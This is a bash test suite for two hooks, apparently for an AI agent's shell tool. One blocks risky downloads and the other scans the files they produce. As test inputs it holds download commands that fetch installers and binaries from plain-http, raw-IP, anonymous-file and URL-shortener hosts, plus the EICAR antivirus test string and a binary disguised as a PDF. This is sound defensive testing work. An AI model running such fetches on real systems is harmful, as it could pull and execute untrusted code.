#!/usr/bin/env bash
# Behavioural tests for download-gate.sh (PreToolUse) and download-scan.sh (PostToolUse).
#
# Tests the HOOKS: does the right payload come out, does it block when it should,
# and — the part that keeps it honest — does it stay QUIET when it should. A
# download gate that fires on every `curl` of a JSON API gets disabled in a day.
#
#   ./test-download-gates.sh              run the matrix
#   ./test-download-gates.sh --self-test  prove the matrix catches a no-op gate
set -uo pipefail

SERGE_DIR="${SERGE_DIR:-$HOME/.sergio}"
SELF_TEST=0
[ "${1:-}" = "--self-test" ] && SELF_TEST=1

TMP="$(mktemp -d)"; export TMPDIR="$TMP"
trap 'rm -rf "$TMP"' EXIT
PASS=0; FAIL=0

run_gate() {
  local gate="$1"
  if [ "$SELF_TEST" = "1" ]; then cat >/dev/null; return 0; fi
  bash "$SERGE_DIR/$gate"
}

# check <name> <expect: block|quiet> <gate> <payload>
check() {
  local name="$1" expect="$2" gate="$3" payload="$4"
  local out rc got
  out="$(printf '%s' "$payload" | run_gate "$gate" 2>&1)"; rc=$?
  if [ "$rc" = "2" ] || printf '%s' "$out" | grep -q '"permissionDecision": *"deny"'; then
    got=block
  else
    got=quiet
  fi
  if [ "$got" = "$expect" ]; then
    PASS=$((PASS+1)); printf '  ok    %s\n' "$name"
  else
    FAIL=$((FAIL+1)); printf '  FAIL  %s (expected %s, got %s)\n    %s\n' "$name" "$expect" "$got" "${out:0:200}"
  fi
}

pre()  { printf '{"hook_event_name":"PreToolUse","tool_name":"Bash","session_id":"%s","tool_input":{"command":%s}}' "$1" "$2"; }
post() { printf '{"hook_event_name":"PostToolUse","tool_name":"Bash","session_id":"%s","cwd":"%s","tool_input":{"command":%s}}' "$1" "$2" "$3"; }
j()    { python3 -c 'import json,sys; print(json.dumps(sys.argv[1]))' "$1"; }

echo "download-gate.sh (PreToolUse — judges the source)"
check "plain http + installer    → block" block download-gate.sh "$(pre s1 "$(j 'curl -O http://get.example.com/install.sh')")"
check "raw IP + binary           → block" block download-gate.sh "$(pre s2 "$(j 'wget https://203.0.113.9/payload.bin')")"
check "anon host + exe           → block" block download-gate.sh "$(pre s3 "$(j 'curl -o t.exe https://anonfiles.com/a/tool.exe')")"
check "url shortener + sh        → block" block download-gate.sh "$(pre s4 "$(j 'curl -O https://bit.ly/x/setup.sh')")"
check "https + named host + sh   → quiet" quiet download-gate.sh "$(pre s5 "$(j 'curl -O https://sh.rustup.rs/install.sh')")"
check "https json API            → quiet" quiet download-gate.sh "$(pre s6 "$(j 'curl -s https://api.github.com/repos/x/y > out.json')")"
check "plain http but NOT exec   → quiet" quiet download-gate.sh "$(pre s7 "$(j 'curl -O http://example.com/data.csv')")"
check "no url at all             → quiet" quiet download-gate.sh "$(pre s8 "$(j 'ls -la')")"
# block-once: same session + same url must go through the second time
check "repeat, same session      → quiet" quiet download-gate.sh "$(pre s1 "$(j 'curl -O http://get.example.com/install.sh')")"

echo
echo "download-scan.sh (PostToolUse — scans the bytes)"
W="$TMP/work"; mkdir -p "$W"

# EICAR: the industry-standard AV test string. Not malware — every engine is
# required to detect it, so it proves the scanner is really wired up.
printf 'X5O!P%%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > "$W/eicar.com"
printf '\177ELF\002\001\001\000fake elf body' > "$W/invoice.pdf"   # binary wearing a .pdf name
printf 'col_a,col_b\n1,2\n'                  > "$W/clean.csv"
printf 'hello'                               > "$W/notes.txt"

if command -v clamscan >/dev/null 2>&1 || command -v clamdscan >/dev/null 2>&1; then
  check "EICAR test virus          → block" block download-scan.sh "$(post p1 "$W" "$(j 'curl -O https://example.com/eicar.com')")"
else
  echo "  skip  EICAR test virus (no clamav installed — install to enable)"
fi
check "ELF disguised as .pdf     → block" block download-scan.sh "$(post p2 "$W" "$(j 'curl -o invoice.pdf https://example.com/invoice.pdf')")"
check "clean csv                 → quiet" quiet download-scan.sh "$(post p3 "$W" "$(j 'wget https://example.com/clean.csv')")"
check "bundled -sSLo form parsed → block" block download-scan.sh "$(post p4 "$W" "$(j 'curl -sSLo invoice.pdf https://example.com/x')")"
check "not a download            → quiet" quiet download-scan.sh "$(post p5 "$W" "$(j 'npm run build')")"
check "download to stdout        → quiet" quiet download-scan.sh "$(post p6 "$W" "$(j 'curl -o - https://example.com/invoice.pdf')")"
check "missing file              → quiet" quiet download-scan.sh "$(post p7 "$W" "$(j 'wget https://example.com/nope.pdf')")"

echo
if [ "$SELF_TEST" = "1" ]; then
  [ "$FAIL" -gt 0 ] && { echo "self-test OK: $FAIL checks caught the no-op gates"; exit 0; }
  echo "SELF-TEST BROKEN: no-op gates passed the matrix"; exit 1
fi
echo "$PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
